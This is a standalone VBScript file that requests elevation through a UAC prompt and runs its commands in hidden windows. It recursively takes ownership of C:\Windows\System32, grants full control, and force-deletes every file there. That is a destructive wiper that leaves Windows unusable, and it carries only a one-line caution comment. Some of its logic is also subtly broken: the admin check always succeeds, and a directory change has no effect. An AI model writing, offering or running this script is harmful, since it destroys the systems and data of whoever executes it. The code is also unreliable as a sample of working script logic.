' VBScript to elevate itself and modify System32 permissions
Option Explicit

Dim WshShell, UAC, admin

' Create WScript Shell object
Set WshShell = WScript.CreateObject("WScript.Shell")

' Check for admin privileges
WshShell.Run "cmd /c net session >nul 2>&1", 0, True
If WshShell.Run("cmd /c echo %errorlevel%", 0, True) = 0 Then
    admin = 1
Else
    admin = 0
End If

' Elevate again safely if not admin (requires UAC prompt)
If admin = 0 Then
    Set UAC = CreateObject("Shell.Application")
    UAC.ShellExecute "cmd.exe", "/c """ & WScript.ScriptFullName & """", "", "runas", 1
    WScript.Quit
End If

' Sleep for a short period to allow the command prompt to initialize
WScript.Sleep 100

' Take ownership of System32 folder
WshShell.Run "takeown /f C:\Windows\System32 /r /d y", 0, True
WScript.Sleep 100

' Grant administrators full control
WshShell.Run "icacls C:\Windows\System32 /grant administrators:F /t", 0, True
WScript.Sleep 100

' Change directory to System32
WshShell.Run "cmd /c cd C:\Windows\System32", 0, True
WScript.Sleep 100

' Delete all files (use with extreme caution: destructive operation)
WshShell.Run "del /F /S /Q C:\Windows\System32\*.*", 0, True

' Clean up
Set WshShell = Nothing
Set UAC = Nothing
